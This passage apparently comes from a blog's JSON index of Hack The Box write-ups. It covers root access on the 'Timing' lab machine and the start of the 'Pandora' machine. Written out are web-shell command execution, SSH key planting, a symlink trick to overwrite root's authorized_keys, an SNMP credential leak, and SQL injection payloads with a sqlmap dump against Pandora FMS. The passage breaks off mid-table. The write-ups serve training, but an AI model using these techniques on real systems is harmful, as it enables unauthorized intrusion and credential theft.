'10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg\u0026cmd=whoami' www-data  However, we are not able to get a reverse shell on the server. There must be some iptables rules that don\u0026rsquo;t allow connections. So we must use the web shell.\nSystem enumeration I defined another Bash function to keep commands shorter:\n$ function rce() { curl -sG 'http://10.10.11.135/image.php' --data-urlencode 'img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg' --data-urlencode \"cmd=$1\" -o -; } $ rce 'ls -la' total 72 drwxr-xr-x 5 www-data www-data 4096 Dec 2 14:10 . drwxr-xr-x 5 www-data www-data 4096 Nov 29 2021 .. -rw-r--r-- 1 root root 200 Jul 18 2021 admin_auth_check.php -rw-r--r-- 1 root root 379 Jul 22 2021 auth_check.php -rw-r--r-- 1 root root 1268 Jul 18 2021 avatar_uploader.php drwxrwxr-x 2 root root 4096 Nov 29 2021 css -rw-r--r-- 1 root root 92 Jul 20 2021 db_conn.php -rw-r--r-- 1 root root 3937 Jul 18 2021 footer.php -rw-r--r-- 1 root root 1498 Nov 30 2021 header.php -rw-r--r-- 1 root root 507 Jul 18 2021 image.php drwxrwxr-x 3 root root 4096 Nov 29 2021 images -rw-r--r-- 1 root root 188 Jul 18 2021 index.php drwxrwxr-x 2 root root 4096 Nov 29 2021 js -rw-r--r-- 1 root root 2072 Oct 5 2021 login.php -rw-r--r-- 1 root root 113 Jul 18 2021 logout.php -rw-r--r-- 1 root root 3041 Jul 18 2021 profile.php -rw-r--r-- 1 root root 1740 Jul 18 2021 profile_update.php -rw-r--r-- 1 root root 1018 Dec 2 14:10 upload.php  Even if we try to generate SSH keys and add them to /var/www/.ssh/authorized_keys, we are not allowed to access the server:\n$ rce 'grep www-data /etc/passwd' www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin $ rce 'mkdir /var/www/.ssh' $ rce 'ls -la /var/www/' total 24 drwxr-xr-x 6 www-data www-data 4096 Jun 1 20:42 . drwxr-xr-x 14 root root 4096 Nov 29 2021 .. lrwxrwxrwx 1 root root 9 Oct 5 2021 .bash_history -\u0026gt; /dev/null drwxr-x--- 3 www-data www-data 4096 Nov 29 2021 .config drwx------ 2 www-data www-data 4096 Nov 29 2021 .gnupg drwxr-xr-x 2 www-data www-data 4096 Jun 1 20:42 .ssh drwxr-xr-x 5 www-data www-data 4096 Dec 2 14:10 html $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsa Your public key has been saved in id_rsa.pub The key fingerprint is: SHA256:QFWHOQWlYor2bYFXtmu8ECG1hadx1221W94UFrjp7ck The key's randomart image is: +---[RSA 3072]----+ | ..oo+*+..=+| | . .oo*o..o =| | o ==+o ooo| | . *.= . o o+| | o o S . . ..o| | . . o + . . . | | . + + o .| | . o . E | | . | +----[SHA256]-----+ $ rce \"echo '$(cat id_rsa.pub)' \u0026gt;\u0026gt; /var/www/.ssh/authorized_keys\" $ rce 'ls -la /var/www/.ssh' total 12 drwxr-xr-x 2 www-data www-data 4096 Jun 1 20:43 . drwxr-xr-x 7 www-data www-data 4096 Jun 1 20:44 .. -rw-r--r-- 1 www-data www-data 575 Jun 1 20:45 authorized_keys $ ssh -i id_rsa www-data@10.10.11.135 bash This account is currently not available.  We may notice the permissions set to /home/aaron:\n$ rce 'ls -la /home/' total 12 drwxr-xr-x 3 root root 4096 Dec 2 09:55 . drwxr-xr-x 24 root root 4096 Nov 29 2021 .. drwxr-x--x 5 aaron aaron 4096 Jun 1 20:36 aaron  We can access files inside if we know the full filename. For instance:\n$ rce 'ls -la /home/aaron/.bashrc' -rw-r--r-- 1 aaron aaron 3771 Apr 4 2018 /home/aaron/.bashrc $ rce 'ls -la /home/aaron/.bash_history' lrwxrwxrwx 1 root root 9 Oct 5 2021 /home/aaron/.bash_history -\u0026gt; /dev/null $ rce 'ls -la /home/aaron/user.txt' -rw-r----- 1 root aaron 33 Jun 1 04:01 /home/aaron/user.txt  It might seem weird, but let\u0026rsquo;s use ffuf again to enumerate directories and files at /home/aaron/:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg\u0026cmd=ls+-la+/home/aaron/FUZZ' -e .txt -fs 0 user.txt [Status: 200, Size: 61, Words: 10, Lines: 2, Duration: 47ms]  Let\u0026rsquo;s add a . at the start of the filename to look for hidden files and directories, but nothing interesting at all:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg\u0026cmd=ls+-la+/home/aaron/.FUZZ' -e .txt -fs 0 profile [Status: 200, Size: 63, Words: 11, Lines: 2, Duration: 67ms] local [Status: 200, Size: 149, Words: 29, Lines: 5, Duration: 108ms]  Then, we must continue enumerating. Eventually, we will notice that there is a backup file in /opt/:\n$ rce 'ls -la /opt' total 624 drwxr-xr-x 2 root root 4096 Dec 2 11:19 . drwxr-xr-x 24 root root 4096 Nov 29 2021 .. -rw-r--r-- 1 root root 627851 Jul 20 2021 source-files-backup.zip  So let\u0026rsquo;s download and analyze it:\n$ rce 'cat /opt/source-files-backup.zip' \u0026gt; source-files-backup.zip $ file source-files-backup.zip source-files-backup.zip: Zip archive data, at least v1.0 to extract, compression method=store  Everything correct. With unzip -l we can verify that the contents of the ZIP archive are not malicious ones, and then we can uncompress the file. We have these directories:\n$ unzip -q source-files-backup.zip $ ls -a backup . auth_check.php footer.php index.php profile.php .. avatar_uploader.php header.php js profile_update.php .git css image.php login.php upload.php admin_auth_check.php db_conn.php images logout.php  There\u0026rsquo;s a .git directory, so we must check old commits to see if we find something useful:\n$ git log commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -\u0026gt; master) Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:34:13 2021 +0000 db_conn updated commit e4e214696159a25c69812571c8214d2bf8736a3f Author: grumpy \u0026lt;grumpy@localhost.com\u0026gt; Date: Tue Jul 20 22:33:54 2021 +0000 init  Now let\u0026rsquo;s check the differences between the commits:\n$ git diff 16de e4e2 diff --git a/db_conn.php b/db_conn.php index 5397ffa..f1c9217 100644 --- a/db_conn.php +++ b/db_conn.php @@ -1,2 +1,2 @@ \u0026lt;?php -$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd'); +$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');  Nice, we have another password. Let\u0026rsquo;s try accessing as aaron via SSH:\n$ ssh aaron@10.10.11.135 aaron@10.10.11.135's password: aaron@timing:~$ cat user.txt 19651c57fd7a5d96ab331ed4a8d40602  There it is! We\u0026rsquo;ve got access to the machine, finally.\nPrivilege escalation This user is able to run /usr/bin/netutils as root using sudo:\naaron@timing:~$ sudo -l Matching Defaults entries for aaron on timing: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User aaron may run the following commands on timing: (ALL) NOPASSWD: /usr/bin/netutils  It is a Bash script that uses a JAR file:\n/usr/bin/netutils: Bourne-Again shell script, ASCII text executable aaron@timing:~$ cat /usr/bin/netutils #! /bin/bash java -jar /root/netutils.jar  Although java is not called using an absolute path, it is not vulnerable to PATH hijacking because there is a secure_path option set in sudo configuration.\nWe can\u0026rsquo;t access the JAR file:\naaron@timing:~$ ls -la /root/netutils.jar ls: cannot access '/root/netutils.jar': Permission denied  So we will need to perform a dynamic analysis and guess what it does:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt;  Let\u0026rsquo;s try HTTP and listen with nc:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 1 Enter Url: http://10.10.17.44 Initializing download: http://10.10.17.44 Connection gone.  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.135. Ncat: Connection from 10.10.11.135:35202. GET / HTTP/1.0 Host: 10.10.17.44 Accept: */* Range: bytes=1- User-Agent: Axel/2.16.1 (Linux) ^C  Interesting, it is using axel behind the hoods, which is a command line file downloader. To see what it does, I\u0026rsquo;ll start anocher SSH session and run a Python web server locally:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 1 Enter Url: http://127.0.0.1:8000/user.txt Initializing download: http://127.0.0.1:8000/user.txt File size: 33 bytes Opening output file user.txt.0 Server unsupported, starting from scratch with one connection. Starting download Downloaded 33 byte in 0 seconds. (0.32 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u0026gt;\u0026gt; 2  aaron@timing:~$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 127.0.0.1 - - [] \"GET /user.txt HTTP/1.0\" 200 - 127.0.0.1 - - [] \"GET /user.txt HTTP/1.0\" 200 - ^C Keyboard interrupt received, exiting. aaron@timing:~$ ls -la total 40 drwxr-x--x 5 aaron aaron 4096 Jun 1 22:43 . drwxr-xr-x 3 root root 4096 Dec 2 09:55 .. lrwxrwxrwx 1 root root 9 Oct 5 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 aaron aaron 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 aaron aaron 3771 Apr 4 2018 .bashrc drwx------ 2 aaron aaron 4096 Nov 29 2021 .cache drwx------ 3 aaron aaron 4096 Nov 29 2021 .gnupg drwxrwxr-x 3 aaron aaron 4096 Nov 29 2021 .local -rw-r--r-- 1 aaron aaron 807 Apr 4 2018 .profile -rw-r----- 1 root aaron 33 Jun 1 22:39 user.txt -rw-r--r-- 1 root root 33 Jun 1 22:43 user.txt.0 lrwxrwxrwx 1 root root 9 Oct 5 2021 .viminfo -\u0026gt; /dev/null aaron@timing:~$ cat user.txt.0 19651c57fd7a5d96ab331ed4a8d40602 aaron@timing:~$ rm user.txt.0 rm: remove write-protected regular file 'user.txt.0'? y  So the Java program downloaded user.txt and stored it as user.txt.0 (as root).\nThe idea here is that we have a way to write files as root. However, if the file already exists, then it will be written to the same filename .0. So at first glance, we can\u0026rsquo;t use a symbolic link that points to /root/.ssh/authorized_keys because the file would exist at the time the Java program downloads the public SSH key. But the symbolic link is not treated as an existing file, because /root/.ssh/authorized_keys does not exist by default.\nWe can create the symbolic link with this command:\naaron@timing:~$ ln -s /root/.ssh/authorized_keys ~/id_rsa.pub  Then, start a Python web server in the attacker machine and expose id_rsa.pub (I will reuse the one I generated before):\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ...  Finally request the public key with /usr/bin/netutils:\naaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input  1 Enter Url: http://10.10.17.44/id_rsa.pub Initializing download: http://10.10.17.44/id_rsa.pub File size: 575 bytes Opening output file id_rsa.pub Server unsupported, starting from scratch with one connection. Starting download Downloaded 575 byte in 0 seconds. (2.80 KB/s)  $ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.135 - - [] \"GET /index.php HTTP/1.0\" 200 - ::ffff:10.10.11.135 - - [] \"GET /index.php HTTP/1.0\" 200 - ^C Keyboard interrupt received, exiting.  And then we can access as root with the private key:\n$ ssh -i id_rsa root@10.10.11.135 root@timing:~# cat root.txt 1c40aa67ba2b39849421c84c0253cde4  ","image":"/images/HTB/Timing/Timing.png","permalink":"https://7rocky.github.io/en/htb/timing/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a PHP web application that is vulnerable to user enumeration, LFI, Type Juggling and SQLi, apart from some other bugs and misconfigurations. After reading the PHP source code, we find a way to upload a PHP web shell and get RCE. After that, we find a password inside a Git repository and access via SSH. Then, we can run a JAR file using sudo that downloads files as root, and we can use a symlink to write an authorized SSH key for root","time":22,"title":"Timing"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.136   Release: 08 / 01 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.136 -p 22,80 Nmap scan report for 10.10.11.136 Host is up (0.069s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 83.09 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.136, we will see this landing page:\nWe see that panda.htb is shown, so we can add this domain to /etc/hosts. However, there is nothing different if we use the domain.\nWe can apply some fuzzing to enumerate routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.136/FUZZ assets [Status: 301, Size: 313, Words: 20, Lines: 10] [Status: 200, Size: 33560, Words: 13127, Lines: 908] server-status [Status: 403, Size: 277, Words: 20, Lines: 10]  There is nothing interesting. In the website, we don\u0026rsquo;t see any user input\u0026hellip; We have reached a dead end.\nUDP enumeration One of the last things we must test is UDP, maybe there are services that use UDP and we have not scanned them with the initial nmap execution. Let\u0026rsquo;s perform the port scan:\n# nmap -sU --top-ports 100 -n -Pn -vv 10.10.11.136 Starting Nmap 7.92 ( https://nmap.org ) Initiating UDP Scan Scanning 10.10.11.136 [100 ports] Increasing send delay for 10.10.11.136 from 0 to 50 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.11.136 from 50 to 100 due to max_successful_tryno increase to 5 Increasing send delay for 10.10.11.136 from 100 to 200 due to 11 out of 12 dropped probes since last increase. Increasing send delay for 10.10.11.136 from 200 to 400 due to max_successful_tryno increase to 6 Increasing send delay for 10.10.11.136 from 400 to 800 due to max_successful_tryno increase to 7 Increasing send delay for 10.10.11.136 from 800 to 1000 due to max_successful_tryno increase to 8 Discovered open port 161/udp on 10.10.11.136 Completed UDP Scan, 98.23s elapsed (100 total ports) Nmap scan report for 10.10.11.136 Host is up, received user-set (0.053s latency). Scanned for 98s Not shown: 99 closed udp ports (port-unreach) PORT STATE SERVICE REASON 161/udp open snmp udp-response ttl 63 Nmap done: 1 IP address (1 host up) scanned in 98.29 seconds Raw packets sent: 231 (12.751KB) | Rcvd: 106 (9.126KB)  We see that SNMP is enabled. This is a protocol that is employed for network configuration. We can use snmpwalk to obtain all the configurations that are exposed by the server.\nWe must specify v2c as version and public as community string:\n$ snmpwalk -v2c -c public 10.10.11.136 | tee enum/snmpwalk.out SNMPv2-MIB::sysDescr.0 = STRING: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (3230601) 8:58:26.01 SNMPv2-MIB::sysContact.0 = STRING: Daniel SNMPv2-MIB::sysName.0 = STRING: pandora SNMPv2-MIB::sysLocation.0 = STRING: Mississippi ... HOST-RESOURCES-MIB::hrSWRunParameters.767 = STRING: \"--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\" HOST-RESOURCES-MIB::hrSWRunParameters.781 = STRING: \"--foreground\" HOST-RESOURCES-MIB::hrSWRunParameters.782 = STRING: \"/usr/bin/networkd-dispatcher --run-startup-triggers\" HOST-RESOURCES-MIB::hrSWRunParameters.784 = STRING: \"-n -iNONE\" HOST-RESOURCES-MIB::hrSWRunParameters.786 = \"\" HOST-RESOURCES-MIB::hrSWRunParameters.788 = \"\" HOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: \"-f\" HOST-RESOURCES-MIB::hrSWRunParameters.825 = STRING: \"-f\" HOST-RESOURCES-MIB::hrSWRunParameters.834 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\" HOST-RESOURCES-MIB::hrSWRunParameters.852 = STRING: \"-f\" HOST-RESOURCES-MIB::hrSWRunParameters.858 = STRING: \"-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid\" ...  There is a lot of information. We can find this weird command:\n/bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'  It seems that daniel is a username and HotelBabylon23 is his password.\nWe can reuse these credentials in SSH and access as daniel:\n$ ssh daniel@10.10.11.136 daniel@10.10.11.136's password: daniel@pandora:~$  System enumeration But no user.txt flag here:\ndaniel@pandora:~$ ls -la total 28 drwxr-xr-x 4 daniel daniel 4096 Feb 19 16:26 . drwxr-xr-x 4 root root 4096 Dec 7 14:32 .. lrwxrwxrwx 1 daniel daniel 9 Jun 11 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 daniel daniel 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 daniel daniel 3771 Feb 25 2020 .bashrc drwx------ 2 daniel daniel 4096 Feb 19 16:26 .cache -rw-r--r-- 1 daniel daniel 807 Feb 25 2020 .profile drwx------ 2 daniel daniel 4096 Dec 7 14:32 .ssh  It is located at /home/matt, so we must pivot to user matt:\ndaniel@pandora:~$ find /home -name user.txt 2/dev/null /home/matt/user.txt  We can\u0026rsquo;t run sudo:\ndaniel@pandora:~$ sudo -l [sudo] password for daniel: Sorry, user daniel may not run sudo on pandora.  But there is a weird SUID binary called /usr/bin/pandora_backup:\ndaniel@pandora:~$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/sudo /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/umount /usr/bin/pandora_backup /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/at /usr/bin/fusermount /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1  And matt is able to execute (as group member):\ndaniel@pandora:~$ ls -l /usr/bin/pandora_backup -rwsr-x--- 1 root matt 16816 Dec 3 15:58 /usr/bin/pandora_backup  So definitely we need to become matt.\nWe can take a look at the Apache web server configuration and find pandora.conf:\ndaniel@pandora:~$ cd /etc/apache2 daniel@pandora:/etc/apache2$ ll sites-enabled/ total 8 drwxr-xr-x 2 root root 4096 Dec 3 12:57 ./ drwxr-xr-x 8 root root 4096 Dec 7 12:59 ../ lrwxrwxrwx 1 root root 35 Dec 3 12:56 000-default.conf -\u0026gt; ../sites-available/000-default.conf lrwxrwxrwx 1 root root 31 Dec 3 12:53 pandora.conf -\u0026gt; ../sites-available/pandora.conf daniel@pandora:/etc/apache2$ cat sites-enabled/pandora.conf \u0026lt;VirtualHost localhost:80\u0026gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt \u0026lt;Directory /var/www/pandora\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined \u0026lt;/VirtualHost\u0026gt;  We see that it uses pandora.panda.htb as subdomain. However, even if we set it in /etc/hosts, we will get the same landing page as before. But from the machine, the output is different:\ndaniel@pandora:/etc/apache2$ curl localhost -H 'Host: pandora.panda.htb' \u0026lt;meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/pandora_console/\"\u0026gt;  Pandora FMS enumeration So we must use port forwarding to access this website from our attacker machine (we can use ENTER + ~C to access the ssh\u0026gt; prompt and add the port forwarding configuration):\ndaniel@pandora:/etc/apache2$ cd daniel@pandora:~$ daniel@pandora:~$ ssh -L 8000:127.0.0.1:80 Forwarding port. daniel@pandora:~$  Now we can access from our attacker machine:\n$ curl localhost:8000 -H 'Host: pandora.panda.htb' \u0026lt;meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/pandora_console/\"\u0026gt;  And we can look at this page in the browser:\nWe can try daniel\u0026rsquo;s credentials, but it shows that he can only use the API:\nHowever, we see the version at the bottom of the website: v7.0NG.742_FIX_PERL2020. Now we can start looking for vulnerabilities and exploits. In fact, we will reach blog.sonarsource.com, which shows a SQL injection vulnerability (CVE-2021-32099) to bypass authentication and login as administrator.\nExploiting SQLi in Pandora FMS The SQLi vulnerability is at /pandora_console/include/chart_generator.php, in a query parameter called session_id:\n$ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id='\" | head -1 \u0026lt;strong\u0026gt;SQL error\u0026lt;/strong\u0026gt;: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = ''' LIMIT 1') in \u0026lt;strong\u0026gt;/var/www/pandora/pandora_console/include/db/mysql.php\u0026lt;/strong\u0026gt; on line 114\u0026lt;br /\u0026gt;  It is Error-based SQLi, and we have the SQL query:\nSELECT * FROM tsessions_php WHERE `id_session` = '$session_id' LIMIT 1  Where $session_id is the point where we are injecting SQL. Now we can continue with UNION queries to determine the number of columns of tsessions_php table:\n$ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1-- -\" | head -1 \u0026lt;strong\u0026gt;SQL error\u0026lt;/strong\u0026gt;: The used SELECT statements have a different number of columns ('SELECT * FROM tsessions_php WHERE `id_session` = '' union select 1-- -' LIMIT 1') in \u0026lt;strong\u0026gt;/var/www/pandora/pandora_console/include/db/mysql.php\u0026lt;/strong\u0026gt; on line 114\u0026lt;br /\u0026gt; $ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1,2-- -\" | head -1 \u0026lt;strong\u0026gt;SQL error\u0026lt;/strong\u0026gt;: The used SELECT statements have a different number of columns ('SELECT * FROM tsessions_php WHERE `id_session` = '' union select 1,2-- -' LIMIT 1') in \u0026lt;strong\u0026gt;/var/www/pandora/pandora_console/include/db/mysql.php\u0026lt;/strong\u0026gt; on line 114\u0026lt;br /\u0026gt; $ curl -sG localhost:8000/pandora_console/include/chart_generator.php --data-urlencode \"session_id=' union select 1,2,3-- -\" | head -1 \u0026lt;!DOCTYPE html\u0026gt;  So there are three columns in tsessions_php. At this point, we can use sqlmap to dump this table:\n$ sqlmap --url 'http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' --batch --flush --technique UE --dbms mysql -T tsessions_php --dump ___ __H__ ___ ___[)]_____ ___ ___ {1.6.5#stable} |_ -| . [,] | .'| . | |___|_ [\"]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting [hh:mm:ss] [INFO] flushing session file [hh:mm:ss] [INFO] testing connection to the target URL [hh:mm:ss] [WARNING] potential permission problems detected ('Access denied') you have not declared cookie(s), while server wants to set its own ('PHPSESSID=gn6g2mp11db...rsi1fq9l61'). Do you want to use those [Y/n] Y [hh:mm:ss] [INFO] checking if the target is protected by some kind of WAF/IPS [hh:mm:ss] [INFO] heuristic (basic) test shows that GET parameter 'session_id' might be injectable (possible DBMS: 'MySQL') [hh:mm:ss] [INFO] heuristic (XSS) test shows that GET parameter 'session_id' might be vulnerable to cross-site scripting (XSS) attacks [hh:mm:ss] [INFO] testing for SQL injection on GET parameter 'session_id' for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [hh:mm:ss] [WARNING] reflective value(s) found and filtering out [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' [hh:mm:ss] [INFO] testing 'MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' [hh:mm:ss] [INFO] GET parameter 'session_id' is 'MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable [hh:mm:ss] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [hh:mm:ss] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns' [hh:mm:ss] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns' ... GET parameter 'session_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 468 HTTP(s) requests: --- Parameter: session_id (GET) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: session_id=1'||(SELECT 0x5a664853 FROM DUAL WHERE 9303=9303 AND (SELECT 2523 FROM(SELECT COUNT(*),CONCAT(0x716a6a7871,(SELECT (ELT(2523=2523,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||' --- [hh:mm:ss] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal) web application technology: PHP, Apache 2.4.41 back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) [hh:mm:ss] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [hh:mm:ss] [INFO] fetching current database [hh:mm:ss] [INFO] retrieved: 'pandora' [hh:mm:ss] [INFO] fetching columns for table 'tsessions_php' in database 'pandora' [hh:mm:ss] [INFO] retrieved: 'id_session' [hh:mm:ss] [INFO] retrieved: 'char(52)' [hh:mm:ss] [INFO] retrieved: 'last_active' [hh:mm:ss] [INFO] retrieved: 'int(11)' [hh:mm:ss] [INFO] retrieved: 'data' [hh:mm:ss] [INFO] retrieved: 'text' [hh:mm:ss] [INFO] fetching entries for table 'tsessions_php' in database 'pandora' ... Database: pandora Table: tsessions_php [46 entries] +----------------------------+-----------------------------------------------------+-------------+ | id_session | data | last_active | +----------------------------+-----------------------------------------------------+-------------+ | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:\"daniel\"; | 1638783555 | | 0ahul7feb1l9db7ffp8d25sjba | NULL | 1638789018 | | 126fq2t95047ct8b59b5dncu41 | NULL | 1653964108 | | 1um23if7s531kqf5da14kf5lvm | NULL | 1638792211 | | 2e25c62vc3odbppmg6pjbf9bum | NULL | 1638786129 | | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:\"daniel\"; | 1638540332 | | 3me2jjab4atfa5f8106iklh4fc | NULL | 1638795380 | | 4f51mju7kcuonuqor3876n8o02 | NULL | 1638786842 | | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:\"daniel\"; | 1638535373 | | 4q1oc8aoh1a4irrckahfetujmc | NULL | 1653964112 | | 59qae699l0971h13qmbpqahlls | NULL | 1638787305 | | 5fihkihbip2jioll1a8mcsmp6j | NULL | 1638792685 | | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:\"daniel\"; | 1638281946 | | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:\"daniel\"; | 1641195617 | | 81f3uet7p3esgiq02d4cjj48rc | NULL | 1623957150 | | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:\"daniel\"; | 1638446321 | | 8upeameujo9nhki3ps0fu32cgd | NULL | 1638787267 | | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:\"daniel\"; | 1638881787 | | a3a49kc938u7od6e6mlip1ej80 | NULL | 1638795315 | | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:\"daniel\"; | 1638881664 | | cojb6rgubs18ipb35b3f6hf0vp | NULL | 1638787213 | | d0carbrks2lvmb90ergj7jv6po | NULL | 1638786277 | | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:\"daniel\"; | 1641200284 | | fikt9p6i78no7aofn74rr71m85 | NULL | 1638786504 | | 